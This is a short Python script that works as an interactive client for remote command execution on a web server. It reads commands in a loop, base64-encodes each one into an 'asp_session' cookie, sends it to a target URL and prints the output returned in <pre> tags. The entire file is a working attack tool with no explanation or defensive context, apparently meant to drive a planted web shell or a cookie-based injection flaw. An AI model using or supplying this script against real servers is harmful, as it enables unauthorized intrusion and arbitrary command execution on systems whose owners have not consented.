import requests
import base64
import sys
from bs4 import BeautifulSoup

url = sys.argv[1]

while True:
        command = input("Command to Execute: ")
        encoded_command = base64.b64encode(command.encode("ascii")).decode("ascii")
        headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0","Cookie":f"asp_session={encoded_command}"}
#       print(headers)
        resp = requests.get(url, headers=headers)
#       print(resp.status_code)
        #print(resp.text)
        soup = BeautifulSoup(resp.content, "html.parser")
        pre_tags = soup.find_all("pre")
        for pre in pre_tags:
                print(pre.get_text())
